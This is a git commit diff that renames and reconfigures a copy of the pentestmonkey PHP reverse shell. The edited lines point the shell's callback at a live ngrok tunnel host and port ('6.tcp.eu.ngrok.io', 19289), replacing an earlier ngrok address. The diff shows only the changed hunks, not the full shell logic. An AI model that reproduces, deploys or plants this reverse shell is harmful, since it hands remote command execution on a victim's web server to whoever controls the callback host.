c0ee2df4af51bc76230bb35f12a27d5b6694d227
ReliableSecurity <122018430+ReliableSecurity@users.noreply.github.com>
2023-05-07 20:30:29 +0300

    Update and rename monkey_shell.php to kiber_monkey_shell.php

--- kiber_monkey_shell.php
+++ kiber_monkey_shell.php
@@ -1,4 +1,3 @@
-
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -47,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '2.tcp.ngrok.io';  // CHANGE THIS
-$port = 19176;       // CHANGE THIS
+$ip = '6.tcp.eu.ngrok.io';  // CHANGE THIS
+$port = 19289;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -188,5 +187,3 @@ function printit ($string) {
 }
 
 ?> 
-
-
